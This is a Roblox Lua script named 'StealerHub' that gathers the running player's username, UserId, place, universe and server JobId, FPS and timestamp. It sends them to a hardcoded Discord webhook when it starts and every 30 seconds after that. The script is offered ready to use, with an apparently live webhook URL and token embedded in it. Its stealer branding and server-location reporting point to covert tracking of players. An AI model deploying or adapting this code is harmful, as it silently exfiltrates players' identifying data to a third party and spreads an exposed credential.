-- ==========================================
-- STEALER HUB: CLEAN VERSION
-- Only requires: Webhook URL
-- Sender Name: Your Roblox Username
-- ==========================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- CONFIG
local WEBHOOK_URL = "https://discord.com/api/webhooks/1555905535658692618/z6o9qqHw52qWenlC7xzKaNaN4D_7EusIe0LQ0O7qzurGA4jpSq-SQBadI9v8k6kCFyWu" -- <--- PASTE YOUR WEBHOOK HERE

-- STATE
local lastFrameTime = tick()
local currentFPS = 60
local freezeDetected = false

-- ==========================================
-- 1. WEBHOOK SENDER
-- ==========================================
local function sendToDiscord(data)
    if not WEBHOOK_URL or WEBHOOK_URL == "PASTE_YOUR_WEBHOOK_URL_HERE" then
        warn("⚠️ StealerHub: Please paste your Webhook URL in the script.")
        return
    end

    local player = Players.LocalPlayer
    local displayName = player.Name -- Uses your Roblox Username

    local payload = {
        username = displayName, -- Sends as YOUR Roblox Name
        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png",
        embeds = {
            {
                title = "📊 Player Report",
                color = 15158332,
                fields = {
                    { name = "Username", value = displayName, inline = true },
                    { name = "UserId", value = tostring(player.UserId), inline = true },
                    { name = "Place ID", value = tostring(game.PlaceId), inline = true },
                    { name = "Universe", value = tostring(game.UniverseId), inline = true },
                    { name = "Server ID", value = tostring(game.JobId), inline = false },
                    { name = "FPS", value = string.format("%.2f", currentFPS), inline = true },
                    { name = "Freeze?", value = tostring(freezeDetected), inline = true },
                    { name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false }
                }
            }
        }
    }

    local jsonPayload = HttpService:JSONEncode(payload)
    
    if not jsonPayload then
        warn("⚠️ StealerHub: Failed to encode JSON.")
        return
    end

    print("📤 StealerHub: Sending as " .. displayName)

    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonPayload
        })
    end)

    if not success then
        warn("❌ StealerHub: Network Error: " .. tostring(response))
        return
    end

    local res = response
    if res.Success then
        print("✅ StealerHub: Sent successfully to Discord.")
    else
        warn("❌ StealerHub: Discord Error. Status: " .. res.StatusCode .. " | " .. res.StatusMessage)
    end
end

-- ==========================================
-- 2. FPS MONITOR (FREEZE DETECTION)
-- ==========================================
RunService:BindToRenderStep("StealerHub_FPS", Enum.RenderPriority.PostPhysics.Value, function()
    local now = tick()
    local delta = now - lastFrameTime
    lastFrameTime = now
    
    if delta > 0 then
        currentFPS = (currentFPS * 0.9) + ((1 / delta) * 0.1)
    end

    if currentFPS < 15 then
        freezeDetected = true
    elseif currentFPS > 30 then
        freezeDetected = false
    end
end)

-- ==========================================
-- 3. MAIN EXECUTION
-- ==========================================
local function main()
    local player = Players.LocalPlayer
    print("🚀 StealerHub: Active for " .. player.Name)
    
    -- Send Initial Report
    sendToDiscord()

    -- Periodic Checks (Every 30s)
    task.spawn(function()
        while true do
            task.wait(30)
            if Players.LocalPlayer then
                sendToDiscord()
            end
        end
    end)
end

main()
